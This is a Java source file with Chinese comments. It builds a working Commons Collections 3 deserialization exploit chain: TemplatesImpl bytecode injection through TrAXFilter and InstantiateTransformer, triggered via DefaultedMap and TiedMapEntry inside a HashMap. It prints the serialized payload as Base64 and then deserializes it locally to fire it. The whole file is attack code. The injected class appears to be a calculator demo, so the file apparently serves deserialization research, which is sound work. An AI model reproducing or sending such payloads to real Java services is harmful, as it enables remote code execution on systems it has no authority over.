import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC3_plus {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void main(String[] args) throws Exception{
        //创建TemplatesImpl对象加载字节码
        byte[] code = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_name","jiang");
        setFieldValue(obj,"_class",null);
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(obj,"_bytecodes",new byte[][]{code});

        //创建 ChainedTransformer实例
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]{Templates.class},new Object[]{obj}),
        };
        ChainedTransformer chain = new ChainedTransformer(fakeTransformers);
        //创建DefaultedMap 实例
        HashMap innermap = new HashMap();
        Map defaultedmap = DefaultedMap.decorate(innermap,chain);

        //创建 TiedMapEntry实例
        TiedMapEntry tme = new TiedMapEntry(defaultedmap,"jiang");
        //创建readObject 入口
        HashMap evilmap = new HashMap();
        evilmap.put(tme,"jiang");
        defaultedmap.remove("jiang");
        setFieldValue(chain, "iTransformers", transformers);
        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(evilmap);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}